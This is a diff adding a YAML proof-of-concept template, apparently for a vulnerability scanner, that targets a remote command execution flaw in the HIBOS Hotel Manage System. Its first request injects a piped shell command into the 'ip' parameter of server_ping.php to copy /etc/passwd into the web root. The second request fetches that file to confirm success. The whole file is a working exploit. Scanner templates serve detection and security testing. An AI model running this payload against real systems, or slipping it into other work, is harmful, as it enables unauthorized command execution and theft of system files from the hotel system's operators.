@@ -1,0 +1,26 @@
+id: poc-yaml-hibos-hotel-manage-system-rce
+info:
+  name: HIBOS Hotel Manage System 远程命令执行漏洞
+  severity: critical
+  tags:
+  - rce
+  finger: HIBOS
+  osprey-id: vb_2021_0046
+variables:
+  r_rand_name: random_str(5)
+requests:
+- method: GET
+  path: /manager/radius/server_ping.php?ip=127.0.0.1|cat%20/etc/passwd%20>../../{{.r_rand_name}}.txt&id=1
+  headers:
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML,
+      like Gecko) Chrome/86.0.4240.111 Safari/537.36
+  expression: 'contains(body, "parent.doTestResult")
+
+    '
+- method: GET
+  path: /{{.r_rand_name}}.txt
+  headers: {}
+  expression: 'contains(body, "root:") && !contains(body, "<") && contains(body, "/bin")
+
+    '
+transport: http
